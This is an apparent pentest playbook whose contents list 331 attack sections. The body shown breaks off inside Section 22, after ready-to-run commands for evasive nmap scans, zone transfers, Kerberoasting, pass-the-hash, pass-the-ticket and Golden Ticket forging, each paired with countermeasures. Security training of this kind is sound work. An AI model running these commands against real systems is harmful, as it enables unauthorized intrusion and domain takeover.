![Banner](https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200&h=300&fit=crop)

# 📖 The Ultimate Hacker's Playbook: Advanced Auditing & Exploitation Reference

[⬅️ Vault Home](../Home.md)

## 📋 Table of Contents

### 🔭 Phase 1: Reconnaissance & Advanced Scanning (Sections 1–15)
- [[#Section 1: TCP NULL Scan]]
- [[#Section 2: TCP FIN Scan]]
- [[#Section 3: TCP Xmas Scan]]
- [[#Section 4: TCP ACK Scan (Firewall Mapping)]]
- [[#Section 5: TCP Window Scan]]
- [[#Section 6: IP Packet Fragmentation Evasion]]
- [[#Section 7: Source Port Manipulation]]
- [[#Section 8: Bad Checksum Evasion Probing]]
- [[#Section 9: Passive DNS Reconnaissance (Subfinder/Amass)]]
- [[#Section 10: Shodan Search Queries]]
- [[#Section 11: Certificate Transparency Log Scraping]]
- [[#Section 12: SPF/DKIM/DMARC Record Audit]]
- [[#Section 13: SNMP Walk & MIB Enumeration]]
- [[#Section 14: WAF Fingerprinting (Wafw00f)]]
- [[#Section 15: DNS Zone Transfer (AXFR)]]

### 🏰 Phase 2: Active Directory & Identity Security (Sections 16–35)
- [[#Section 16: LDAP Schema Information Gathering]]
- [[#Section 17: Kerberoastable Account Discovery]]
- [[#Section 18: AS-REP Roastable Account Discovery]]
- [[#Section 19: BloodHound Data Collection]]
- [[#Section 20: Pass-the-Hash (NTLM Relay)]]
- [[#Section 21: Pass-the-Ticket (Kerberos TGT)]]
- [[#Section 22: Golden Ticket (Domain Trust Abuse)]]
- [[#Section 23: Silver Ticket (Service Trust Abuse)]]
- [[#Section 24: Overpass-the-Hash (AS-REQ Request)]]
- [[#Section 25: Kerberos Constrained Delegation (KCD)]]
- [[#Section 26: Resource-Based Constrained Delegation (RBCD)]]
- [[#Section 27: Active Directory Certificate Services (ADCS) ESC1]]
- [[#Section 28: ADCS ESC8 (NTLM Relay to HTTP CA)]]
- [[#Section 29: SID History Injection (Child to Forest Root)]]
- [[#Section 30: GPO Policy Hijacking & Modification]]
- [[#Section 31: LSA Secrets Dumping]]
- [[#Section 32: SAM Registry Hive Hashing]]
- [[#Section 33: NTDS.dit Extraction]]
- [[#Section 34: LSASS Process Memory Dumping]]
- [[#Section 35: Active Directory Domain Controller DCSync]]

### 🌐 Phase 3: Advanced Web Exploitation (Sections 36–65)
- [[#Section 36: SQLMap HTTP Request Injection]]
- [[#Section 37: SQLMap Blind Time-Based Exploitation]]
- [[#Section 38: SQLMap OS-Shell Injection]]
- [[#Section 39: Blind NoSQL Injection (MongoDB)]]
- [[#Section 40: Out-of-Band (OOB) SQL Injection]]
- [[#Section 41: Server-Side Request Forgery (SSRF) AWS Metadata]]
- [[#Section 42: SSRF Redis Gopher Protocol Tunneling]]
- [[#Section 43: Server-Side Template Injection (SSTI) Jinja2 RCE]]
- [[#Section 44: SSTI FreeMarker RCE]]
- [[#Section 45: SSTI Thymeleaf RCE]]
- [[#Section 46: Java Insecure Deserialization]]
- [[#Section 47: Python Pickle Deserialization]]
- [[#Section 48: PHP Object Injection]]
- [[#Section 49: XML External Entity (XXE) Local File Read]]
- [[#Section 50: XXE Blind OOB Data Exfiltration]]
- [[#Section 51: JWT Signature Bypass (None Algorithm)]]
- [[#Section 52: JWT Key Confusion Attack]]
- [[#Section 53: XSS Cookie Theft Session Hijack]]
- [[#Section 54: XSS Keylogger Payload]]
- [[#Section 55: Stored XSS CSRF Chain]]
- [[#Section 56: Cross-Site Request Forgery (CSRF) Password Reset]]
- [[#Section 57: LFI Log Poisoning RCE]]
- [[#Section 58: LFI PHP Wrapper Resource Filter Extraction]]
- [[#Section 59: Remote File Inclusion (RFI)]]
- [[#Section 60: Server-Side Prototype Pollution (NodeJS)]]
- [[#Section 61: HTTP Request Smuggling (CL.TE)]]
- [[#Section 62: HTTP Request Smuggling (TE.CL)]]
- [[#Section 63: Directory Traversal Path Bypass]]
- [[#Section 64: Race Condition Web Account Overdraw]]
- [[#Section 65: Insecure Direct Object Reference (IDOR) File Exfiltration]]

### 🔗 Phase 4: API & GraphQL Security (Sections 66–75)
- [[#Section 66: REST API Endpoint Discovery (ffuf)]]
- [[#Section 67: Broken Object Level Authorization (BOLA)]]
- [[#Section 68: Broken Object Property Level Authorization (BOPLA)]]
- [[#Section 69: GraphQL Introspection Query]]
- [[#Section 70: GraphQL Query Depth Denial of Service (DoS)]]
- [[#Section 71: GraphQL Batch Query Attack]]
- [[#Section 72: REST API Mass Assignment]]
- [[#Section 73: API Key Leakage (Github Scraping)]]
- [[#Section 74: Server-Side Parameter Pollution (SSPP)]]
- [[#Section 75: WebSockets Message Spoofing]]

### ☁️ Phase 5: Cloud & Container Security (Sections 76–90)
- [[#Section 76: AWS IMDSv2 Bypass Attempts]]
- [[#Section 77: AWS IAM Policy Misconfiguration Auditing]]
- [[#Section 78: AWS S3 Bucket Open Access Verification]]
- [[#Section 79: Azure AD Reconnaissance (Microburst)]]
- [[#Section 80: Azure VM Managed Identity Token Theft]]
- [[#Section 81: Google Cloud Storage Bucket Data Exfiltration]]
- [[#Section 82: Docker Socket Escape (Host Mount Abuse)]]
- [[#Section 83: Docker Container Privilege Escalation (SYS_ADMIN)]]
- [[#Section 84: Kubernetes API Server Access Auditing]]
- [[#Section 85: Kubernetes Service Account Token Theft]]
- [[#Section 86: Kubernetes Kubelet API Exploit]]
- [[#Section 87: Container Cgroup Directory Escape]]
- [[#Section 88: Container Host PID Namespace Sharing]]
- [[#Section 89: Cloud Instance Metadata SSRF Exfiltration]]
- [[#Section 90: Serverless Function Environment Variable Theft]]

### 🌐 Phase 6: Infrastructure & Protocol Exploitation (Sections 91–110)
- [[#Section 91: VLAN Hopping Attack (Yersinia)]]
- [[#Section 92: DHCP Starvation Attack]]
- [[#Section 93: CDP/LLDP Reconnaissance & Spoofing]]
- [[#Section 94: STP Root Bridge Election Hijacking]]
- [[#Section 95: HSRP/VRRP Gateway Hijacking]]
- [[#Section 96: SNMP v1/v2c Community String Guessing]]
- [[#Section 97: SMTP Open Relay Mail Spoofing]]
- [[#Section 98: SMTP User Enumeration (VRFY/EXPN)]]
- [[#Section 99: FTP Bounce Scanning Attack]]
- [[#Section 100: SSH Brute Force & Authorized Keys Inject]]
- [[#Section 101: RDP Session Hijacking (tscon)]]
- [[#Section 102: RDP BlueKeep (CVE-2019-0708) Concept]]
- [[#Section 103: SMB Session Null Session Connection]]
- [[#Section 104: VNC Password Decryption]]
- [[#Section 105: IPSec VPN Aggressive Mode PSK Cracking]]
- [[#Section 106: DNS Cache Poisoning (Kaminsky Attack Concept)]]
- [[#Section 107: BGP Route Hijacking Concepts]]
- [[#Section 108: NTP Amplification Distributed DoS]]
- [[#Section 109: SIP VoIP Calling Session Interception]]
- [[#Section 110: Modbus/TCP ICS Command Injection]]

### 🔑 Phase 7: Privilege Escalation & Persistence (Sections 111–135)
- [[#Section 111: UAC Bypass via Mock Folders & DLL Hijacking]]
- [[#Section 112: SeImpersonatePrivilege Abuse (PrintSpoofer)]]
- [[#Section 113: SeBackupPrivilege SAM/SYSTEM Extraction]]
- [[#Section 114: SeTakeOwnershipPrivilege Abuse]]
- [[#Section 115: SeDebugPrivilege LSASS Memory Injection]]
- [[#Section 116: Unquoted Service Path Privilege Escalation]]
- [[#Section 117: Insecure Service Executable Permissions Abuse]]
- [[#Section 118: AlwaysInstallElevated MSI Package Execution]]
- [[#Section 119: Linux SUID/SGID Binary Exploitation]]
- [[#Section 120: Linux Cron Job Wildcard Injection]]
- [[#Section 121: Linux Sudoers File Misconfiguration Abuse]]
- [[#Section 122: Windows Registry Run Keys Persistence]]
- [[#Section 123: Windows Scheduled Tasks Registry Persistence]]
- [[#Section 124: Windows Winlogon Shell Key Hijacking]]
- [[#Section 125: Windows WMI Event Subscription Persistence]]
- [[#Section 126: Windows Service Creation (SC Config) Persistence]]
- [[#Section 127: Linux SSH Key Persistence (Authorized Keys)]]
- [[#Section 128: Linux Systemd Service Persistence]]
- [[#Section 129: Linux RC.local Script Hijacking]]
- [[#Section 130: Linux Cron Tab Persistent Shells]]
- [[#Section 131: Linux User Shell Profile Hijacking (.bashrc)]]
- [[#Section 132: Windows Active Directory AdminSDHolder Persistence]]
- [[#Section 133: Windows AD Security Descriptor modification persistence]]
- [[#Section 134: Linux Web Server Backdoor (PHP Web Shell)]]
- [[#Section 135: Windows Netsh Helper DLL Persistence]]

### 🛡️ Phase 8: Evasion, Obfuscation & Defense Bypass (Sections 136–160)
- [[#Section 136: PowerShell Execution Policy Bypass]]
- [[#Section 137: PowerShell AMSI Bypass via Memory Patching]]
- [[#Section 138: PowerShell ETW Bypass via Memory Patching]]
- [[#Section 139: Windows Defender Exclusion Path Modification]]
- [[#Section 140: Windows Defender Service Disabling]]
- [[#Section 141: Windows Event Log Clearing (wevtutil)]]
- [[#Section 142: Windows Event Log Service Suspension]]
- [[#Section 143: Process Injection via Classic CreateRemoteThread]]
- [[#Section 144: Process Hollowing (RunPE)]]
- [[#Section 145: Process Ghosting Concept]]
- [[#Section 146: DLL Side-Loading]]
- [[#Section 147: VBA Macro Obfuscation & Execution]]
- [[#Section 148: MSHTA HTML Application (HTA) Payload Execution]]
- [[#Section 149: InstallUtil Bypass Execution]]
- [[#Section 150: MSBuild XML Project Payload Compilation & Run]]
- [[#Section 151: Regsvr32 SCT payload execution (Squiblydoo)]]
- [[#Section 152: Rundll32 Control Panel Item (CPL) Payload Execution]]
- [[#Section 153: Certutil Web Payload Downloading & Decoding]]
- [[#Section 154: PowerShell Command Obfuscation]]
- [[#Section 155: WMI/WMIC Remote Payload Execution]]
- [[#Section 156: Linux Auditd Log Service Disabling]]
- [[#Section 157: Linux Syslog File Deletion & Manipulation]]
- [[#Section 158: Linux Shared Library Injection (LD_PRELOAD)]]
- [[#Section 159: Linux Process Memory Dumping]]
- [[#Section 160: Linux Kernel Module Rootkit Loader]]

### 📦 Phase 9: Post-Exploitation & Data Exfiltration (Sections 161–180)
- [[#Section 161: LSA Secrets Dumping (secretsdump.py)]]
- [[#Section 162: NTDS.dit Active Directory Database Extraction (vssadmin)]]
- [[#Section 163: Browser Credential Extraction (SharpChromium)]]
- [[#Section 164: Wi-Fi Cleartext Password Recovery (netsh)]]
- [[#Section 165: RDP Credential Extraction (vaultcmd)]]
- [[#Section 166: Clipboard Text Monitoring & Sniffing]]
- [[#Section 167: Keylogger Implementation (Raw Input APIs)]]
- [[#Section 168: Web Camera Video Capture (DirectShow APIs)]]
- [[#Section 169: Microphone Audio Sniffing (MCI APIs)]]
- [[#Section 170: Host Port Forwarding (netsh interface portproxy)]]
- [[#Section 171: SSH Dynamic Port Forwarding (SOCKS Proxy)]]
- [[#Section 172: Reverse SSH Tunneling]]
- [[#Section 173: DNS Tunneling Data Exfiltration (dnscat2)]]
- [[#Section 174: ICMP Tunneling Data Exfiltration (ptunnel)]]
- [[#Section 175: HTTP/HTTPS Web-Based Data Exfiltration]]
- [[#Section 176: SMB Share Exfiltration]]
- [[#Section 177: Email-Based Data Exfiltration (SMTP/IMAP)]]
- [[#Section 178: Steganography Data Exfiltration (Steghide)]]
- [[#Section 179: Linux Process Triage & Netstat Auditing]]
- [[#Section 180: Automated Host Artifact Collection (Snaffler)]]

### 📡 Phase 10: Cryptography, Wireless & IoT Security (Sections 181–200)
- [[#Section 181: WPA2 Handshake Capture & Cracking (aircrack-ng)]]
- [[#Section 182: WPA3 PMKID Capture & Offline Cracking]]
- [[#Section 183: WPS PIN Rogue Access Point Attack (Reaver)]]
- [[#Section 184: Wireless Evil Twin Access Point Setup (Hostapd-mana)]]
- [[#Section 185: Bluetooth Device Reconnaissance & Service Scanning]]
- [[#Section 186: Bluetooth Bluejacking & Bluesnarfing Concepts]]
- [[#Section 187: RFID/NFC Badge Cloning (Proxmark3)]]
- [[#Section 188: Zigbee Smart Home Protocol Sniffing]]
- [[#Section 189: RTL-SDR Sub-GHz Signal Replay (HackRF)]]
- [[#Section 190: JTAG/UART Hardware Debug Port Access Concepts]]
- [[#Section 191: Flash Memory Chip Dump via SPI interface]]
- [[#Section 192: Firmware Binary Analysis & Extraction (Binwalk)]]
- [[#Section 193: Firmware Emulation & Exploit Testing (QEMU)]]
- [[#Section 194: SSL/TLS Certificate Strength Auditing (testssl.sh)]]
- [[#Section 195: SSH Cipher Suite & Key Exchange Auditing]]
- [[#Section 196: Database Encryption Decoupling & Key Retrieval]]
- [[#Section 197: Hashcat Rule-Based Custom Wordlist Generation]]
- [[#Section 198: Password Vault Database Offline Auditing (KeePass)]]
- [[#Section 199: BitLocker Encryption Key Extraction via TPM Sniffing]]
- [[#Section 200: GnuPG Private Key Export & Ring Auditing]]

### 📜 Phase 11: Advanced Offensive Scripts & Tooling (Sections 246–326)
- [[#Section 246: Advanced Nmap Enumeration Automation]]
- [[#Section 247: Error-Based SQL Injection Tester]]
- [[#Section 248: Reflected/Stored XSS Scanner & Tester]]
- [[#Section 249: Local File Inclusion (LFI) Tester]]
- [[#Section 250: Command Injection Tester]]
- [[#Section 251: Advanced Subdomain Enumeration (OSINT)]]
- [[#Section 252: Basic Active Directory Enumeration (SMB/LDAP)]]
- [[#Section 253: Web Directory & File Brute-Forcer]]
- [[#Section 254: Quick Nmap Stealth Scan Wrapper]]
- [[#Section 255: XXE (XML External Entity) Injection Tester]]
- [[#Section 256: Hash Cracking Helper]]
- [[#Section 257: Linux PrivEsc Enumeration Wrapper]]
- [[#Section 258: Windows Privilege Escalation Enumeration Helper]]
- [[#Section 259: Simple Packet Sniffer (Scapy)]]
- [[#Section 260: Wireless Network Scanner (Scapy)]]
- [[#Section 261: Time-Based Blind SQL Injection Testing]]
- [[#Section 262: Boolean-Based Blind SQL Injection Data Extraction]]
- [[#Section 263: Union-Based SQL Injection Exploitation]]
- [[#Section 264: XML External Entity (XXE) Payload Generation]]
- [[#Section 265: Advanced Command Injection Payload Bypass Testing]]
- [[#Section 266: Advanced XSS Payload Bypass Testing]]
- [[#Section 267: Advanced Local File Inclusion (LFI) Testing]]
- [[#Section 268: Remote File Inclusion (RFI) Payload Testing]]
- [[#Section 269: Subdomain Takeover Vulnerability Checking]]
- [[#Section 270: Advanced Directory & File Bruteforcing]]
- [[#Section 271: Port Knocking Sequence Helper]]
- [[#Section 272: Advanced Active Directory Enumeration]]
- [[#Section 273: Kerberoasting Payload & Hash Extraction]]
- [[#Section 274: AS-REP Roasting Hash Extraction]]
- [[#Section 275: BloodHound Data Collection & Analysis Helper]]
- [[#Section 276: Mimikatz Command Reference Helper]]
- [[#Section 277: Advanced Linux Privilege Escalation Enumeration]]
- [[#Section 278: Advanced Windows Privilege Escalation Enumeration]]
- [[#Section 279: Advanced Packet Sniffing with Scapy]]
- [[#Section 280: Wireless WPA2 Handshake Capture Helper]]
- [[#Section 281: Stealth Port Scanning with Evasion Techniques]]
- [[#Section 282: Reverse Shell Payload Generator]]
- [[#Section 283: Web Shell Payload Generator]]
- [[#Section 284: Data Exfiltration Payload Helper (LAB ONLY!)]]
- [[#Section 285: Persistence Mechanism Helper (Linux/Windows)]]
- [[#Section 286: Pass-the-Hash (PtH) Helper Script]]
- [[#Section 287: DLL Hijacking Discovery Helper]]
- [[#Section 288: SMB Relay Attack Helper]]
- [[#Section 289: ARP Poisoning Helper]]
- [[#Section 290: DNS Cache Poisoning Helper]]
- [[#Section 291: Metasploit Payload Generator Helper]]
- [[#Section 292: sqlmap Command Helper]]
- [[#Section 293: WPScan Command Helper]]
- [[#Section 294: Metasploit Listener Helper]]
- [[#Section 295: Simple Keylogger Skeleton (LAB ONLY!)]]
- [[#Section 296: Buffer Overflow Helper Skeleton]]
- [[#Section 297: Socat Port Forwarding Helper]]
- [[#Section 298: SSH Pivoting Helper]]
- [[#Section 299: Evil-WinRM Helper]]
- [[#Section 300: Netcat Reverse Shell Helper]]
- [[#Section 301: Hash Identifier Helper]]
- [[#Section 302: FTP Anonymous Login Checker]]
- [[#Section 303: SNMP Enumeration Helper]]
- [[#Section 304: WordPress Username Enumeration Tester]]
- [[#Section 305: CrackMapExec Helper]]
- [[#Section 306: AI-Powered Reconnaissance & Analysis]]
- [[#Section 307: Cloud Infrastructure Enumeration (AWS/Azure/GCP)]]
- [[#Section 308: Full Active Directory Enumeration Suite]]
- [[#Section 309: Zero-Knowledge Protocol (ZKP) Testing Concepts]]
- [[#Section 310: Advanced Web Application Fuzzing & Payload Testing]]
- [[#Section 311: Exploit Chain Generator & Planner]]
- [[#Section 312: Multi-Platform Persistence Mechanism Kit]]
- [[#Section 313: Data Exfiltration Tester (Multiple Channels)]]
- [[#Section 314: REST/GraphQL API Security Testing Suite]]
- [[#Section 315: Container Escape & Privilege Escalation Tester]]
- [[#Section 316: ICS/SCADA Modbus Enumeration Helper]]
- [[#Section 317: AI-Powered Malicious Payload Generation (LAB ONLY)]]
- [[#Section 318: Active Directory Certificate Services (AD CS) Exploit Helper]]
- [[#Section 319: Wi-Fi WPA3 PMKID Capture & Cracking Helper]]
- [[#Section 320: Obfuscation & Tunneling Helper Script]]
- [[#Section 321: Fileless Malware Concept Demonstration (LAB ONLY)]]
- [[#Section 322: Sandbox Detection & Evasion Checker]]
- [[#Section 323: Software Supply Chain Vulnerability Tester]]
- [[#Section 324: Forensic Wiper Concepts (Educational LAB Use)]]
- [[#Section 325: Red Team Engagement & OpSec Planner]]
- [[#Section 326: Web3/Smart Contract Vulnerability Testing Concepts]]

### ⚡ Phase 12: Elite Arsenal — Production-Grade Offensive Tools (Sections 327–331)
- [[#Section 327: Elite Recon Engine — Full-Spectrum Target Reconnaissance]]
- [[#Section 328: Elite Web Vulnerability Scanner — Multi-Vector Web Exploitation]]
- [[#Section 329: Elite Privilege Escalation Scanner — Linux & Windows Privesc]]
- [[#Section 330: Elite Exploit & Shell Framework — Payloads, Encoders & Listeners]]
- [[#Section 331: Elite Directory & Endpoint Fuzzer — Content Discovery Engine]]



---

# Phase 1: 🔭 Reconnaissance & Advanced Scanning

---

## Section 1: TCP NULL Scan

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Sends TCP packets with no flags set. Open ports don't respond; closed ports send RST. Useful for firewall evasion since many firewalls only filter SYN packets.

### 💻 Command / Payload
```bash
nmap -sN -p- <target>
```

### 📋 Expected Output
Look for `open|filtered` vs `closed` states in output.

### 🛡️ Countermeasures
Stateful firewalls that track connections will block NULL scans. Enable SYN+ACK validation rules.

---

## Section 2: TCP FIN Scan

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Sends TCP FIN flag only. Per RFC 793, closed ports respond with RST; open ports silently drop the packet. Evades simple packet filters.

### 💻 Command / Payload
```bash
nmap -sF -p- <target>
```

### 📋 Expected Output
Ports showing `open|filtered` are likely open behind a stateless firewall.

### 🛡️ Countermeasures
Stateful inspection firewalls, IDS signatures for anomalous flag combinations.

---

## Section 3: TCP Xmas Scan

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Sets FIN+PSH+URG flags simultaneously (lit up like a Christmas tree). Same logic as FIN scan but more distinctive. Some IDS specifically detect this pattern.

### 💻 Command / Payload
```bash
nmap -sX -p- <target>
```

### 📋 Expected Output
Same as FIN scan: `open|filtered` = likely open, `closed` = confirmed closed.

### 🛡️ Countermeasures
IDS/IPS rules for abnormal TCP flag combinations, stateful firewalls.

---

## Section 4: TCP ACK Scan (Firewall Mapping)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Sends ACK packets to map firewall rules. Doesn't determine open/closed — determines filtered vs unfiltered. RST response = unfiltered, no response = filtered.

### 💻 Command / Payload
```bash
nmap -sA -p- <target>
```

### 📋 Expected Output
All ports return RST = no firewall. Mixed results reveal firewall rule boundaries.

### 🛡️ Countermeasures
This is a mapping technique, not an exploit. Defense: minimize exposed ports, use default-deny rules.

---

## Section 5: TCP Window Scan

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Variant of ACK scan that examines the TCP window size in RST responses. Some OS implementations use different window sizes for open vs closed ports.

### 💻 Command / Payload
```bash
nmap -sW -p- <target>
```

### 📋 Expected Output
Positive window size in RST = open port on certain OS implementations.

### 🛡️ Countermeasures
Normalize TCP window sizes in RST packets. Not reliable on modern patched systems.

---

## Section 6: IP Packet Fragmentation Evasion

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Fragments IP packets into tiny 8-byte or 16-byte pieces to evade IDS/IPS that don't reassemble fragments. The scan itself is a normal SYN scan, but the delivery evades detection.

### 💻 Command / Payload
```bash
nmap -f --mtu 16 -sS <target>
```

### 📋 Expected Output
Same as SYN scan output, but IDS alerts should be absent if evasion works.

### 🛡️ Countermeasures
Implement fragment reassembly in IDS/IPS. Set minimum fragment size thresholds.

---

## Section 7: Source Port Manipulation

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Spoofs the source port to 53 (DNS), 80 (HTTP), or 443 (HTTPS). Some firewalls allow traffic from these 'trusted' source ports through without inspection.

### 💻 Command / Payload
```bash
nmap --source-port 53 -sS <target>
```

### 📋 Expected Output
If scan succeeds with --source-port 53 but fails without it, the firewall has a source-port trust rule.

### 🛡️ Countermeasures
Never create firewall rules based on source port. Inspect all traffic regardless of origin port.

---

## Section 8: Bad Checksum Evasion Probing

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Sends packets with invalid TCP/IP checksums. A real host's TCP stack will drop these silently. If you get a response, it's from a stateless device (firewall/IDS) that doesn't validate checksums.

### 💻 Command / Payload
```bash
nmap --badsum -sS <target>
```

### 📋 Expected Output
Response to bad checksum = stateless middlebox detected. No response = real host TCP stack.

### 🛡️ Countermeasures
Ensure all network devices validate checksums. Enable checksum verification on IDS sensors.

---

## Section 9: Passive DNS Reconnaissance (Subfinder/Amass)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Passively enumerates subdomains using Certificate Transparency logs, DNS databases (VirusTotal, SecurityTrails, Shodan), web archives, and search engine caches. No direct contact with target.

### 💻 Command / Payload
```bash
subfinder -d <domain> -all -o subs.txt
amass enum -passive -d <domain> -o amass.txt
```

### 📋 Expected Output
List of discovered subdomains — often reveals staging, dev, internal, and forgotten assets.

### 🛡️ Countermeasures
Monitor CT logs for your domains. Use wildcard certificates carefully. Remove unused DNS records.

---

## Section 10: Shodan Search Queries

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Queries Shodan's database of internet-connected devices. Reveals open ports, services, banners, SSL certs, vulnerabilities, and technologies without touching the target directly.

### 💻 Command / Payload
```bash
shodan search 'hostname:<domain>'
shodan host <IP>
```

### 📋 Expected Output
Service banners, open ports, CVEs associated with detected software versions.

### 🛡️ Countermeasures
Minimize internet-facing services. Remove version info from banners. Regular Shodan self-audits.

---

## Section 11: Certificate Transparency Log Scraping

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Queries public CT logs to find all SSL/TLS certificates issued for a domain. Reveals subdomains that may not be in DNS but have certificates issued.

### 💻 Command / Payload
```bash
curl -s 'https://crt.sh/?q=%25.<domain>&output=json' | jq '.[].name_value' | sort -u
```

### 📋 Expected Output
Subdomain list from certificate records — often catches internal/staging subdomains.

### 🛡️ Countermeasures
Use wildcard certs to minimize subdomain exposure. Monitor CT logs via services like CertStream.

---

## Section 12: SPF/DKIM/DMARC Record Audit

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Audits email authentication records. Weak SPF (~all instead of -all), missing DKIM, or DMARC set to p=none allows email spoofing for phishing attacks.

### 💻 Command / Payload
```bash
dig TXT <domain> +short
dig TXT _dmarc.<domain> +short
dig TXT default._domainkey.<domain> +short
```

### 📋 Expected Output
SPF with `~all` or `+all` = spoofable. DMARC `p=none` = no enforcement. Missing DKIM = no signing.

### 🛡️ Countermeasures
Set SPF to `-all`, DMARC to `p=reject`, implement DKIM signing on all outbound mail.

---

## Section 13: SNMP Walk & MIB Enumeration

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Queries SNMP agents using default community strings ('public', 'private'). Extracts system info, network interfaces, routing tables, running processes, and installed software.

### 💻 Command / Payload
```bash
snmpwalk -v2c -c public <target>
snmp-check <target>
```

### 📋 Expected Output
Hostname, OS version, network config, ARP tables, running services, user accounts.

### 🛡️ Countermeasures
Change default community strings, use SNMPv3 with authentication, restrict SNMP to management VLAN.

---

## Section 14: WAF Fingerprinting (Wafw00f)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Identifies Web Application Firewalls by analyzing response headers, cookies, and error pages. Knowing the WAF helps select appropriate bypass techniques.

### 💻 Command / Payload
```bash
wafw00f <target_url>
nmap --script http-waf-detect <target>
```

### 📋 Expected Output
WAF vendor/product identification (Cloudflare, AWS WAF, Akamai, ModSecurity, etc.).

### 🛡️ Countermeasures
WAF is defense-in-depth, not a silver bullet. Obfuscate WAF identity where possible.

---

## Section 15: DNS Zone Transfer (AXFR)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Attempts a full DNS zone transfer. If misconfigured, the DNS server sends the complete zone file — all records, subdomains, and internal hostnames.

### 💻 Command / Payload
```bash
dig axfr @<ns-server> <domain>
host -t axfr <domain> <ns-server>
```

### 📋 Expected Output
Complete DNS zone dump with all A, AAAA, CNAME, MX, TXT, SRV records.

### 🛡️ Countermeasures
Restrict AXFR to authorized secondary DNS servers only. Use TSIG authentication for zone transfers.

---

# Phase 2: 🏰 Active Directory & Identity Security

---

## Section 16: LDAP Schema Information Gathering

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Queries LDAP directory for schema, users, groups, OUs, and computer objects. Anonymous bind may work on misconfigured DCs. Reveals AD structure for attack planning.

### 💻 Command / Payload
```bash
ldapsearch -x -H ldap://<DC> -b 'DC=domain,DC=com' '(objectClass=*)' -s sub
```

### 📋 Expected Output
User accounts, group memberships, OU structure, computer objects, service accounts.

### 🛡️ Countermeasures
Disable anonymous LDAP binds. Require LDAP signing. Restrict LDAP access to authenticated users.

---

## Section 17: Kerberoastable Account Discovery

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Finds service accounts with SPNs set. These accounts' TGS tickets can be requested and cracked offline. Service accounts often have weak passwords and high privileges.

### 💻 Command / Payload
```bash
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC>
# Or: Rubeus.exe kerberoast
```

### 📋 Expected Output
List of accounts with SPNs, their TGS ticket hashes for offline cracking with hashcat.

### 🛡️ Countermeasures
Use managed service accounts (MSA/gMSA) with 120+ char auto-rotating passwords. Remove unnecessary SPNs.

---

## Section 18: AS-REP Roastable Account Discovery

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Finds accounts with 'Do not require Kerberos pre-authentication' enabled. Their AS-REP can be requested without credentials and cracked offline.

### 💻 Command / Payload
```bash
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <DC> -format hashcat
```

### 📋 Expected Output
AS-REP hashes for accounts with pre-auth disabled — crack with hashcat mode 18200.

### 🛡️ Countermeasures
Enable Kerberos pre-authentication on ALL accounts. Audit with: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}

---

## Section 19: BloodHound Data Collection

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Collects AD relationships: group memberships, sessions, ACLs, trusts, GPO links. BloodHound visualizes attack paths from owned accounts to Domain Admin.

### 💻 Command / Payload
```bash
bloodhound-python -u <user> -p <pass> -d <domain> -c All -dc <DC>
# Or: SharpHound.exe -c All
```

### 📋 Expected Output
JSON files importable into BloodHound GUI — reveals shortest path to DA, kerberoastable paths, ACL abuse chains.

### 🛡️ Countermeasures
Minimize excessive AD permissions. Implement tiered administration. Regular ACL audits.

---

## Section 20: Pass-the-Hash (NTLM Relay)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses captured NTLM hash directly for authentication without knowing the plaintext password. Works against SMB, WinRM, RDP (with restricted admin), and LDAP.

### 💻 Command / Payload
```bash
crackmapexec smb <targets> -u <user> -H <NTLM_hash>
pth-winexe -U <domain>/<user>%<hash> //<target> cmd.exe
```

### 📋 Expected Output
Authenticated session on target system — command execution, file access, lateral movement.

### 🛡️ Countermeasures
Disable NTLM where possible, enforce SMB signing, enable Credential Guard, use Protected Users group.

---

## Section 21: Pass-the-Ticket (Kerberos TGT)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Injects a stolen Kerberos TGT into the current session to authenticate as that user. Unlike PtH, works even when NTLM is disabled.

### 💻 Command / Payload
```bash
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass <domain>/<user>@<target>
```

### 📋 Expected Output
Authenticated Kerberos session — full access as the ticket owner.

### 🛡️ Countermeasures
Monitor for anomalous TGT usage (different IP than usual). Short TGT lifetimes. Credential Guard.

---

## Section 22: Golden Ticket (Domain Trust Abuse)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Forges TGTs using the KRBTGT account hash. Grants unrestricted access to the entire domain. Persists until KRBTGT password is changed TWICE.

### 💻 Command / Payload
```bash
ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain <domain> Administrator
export KRB5CCNAME=Administrator.ccache
```

### 📋 Expected Output
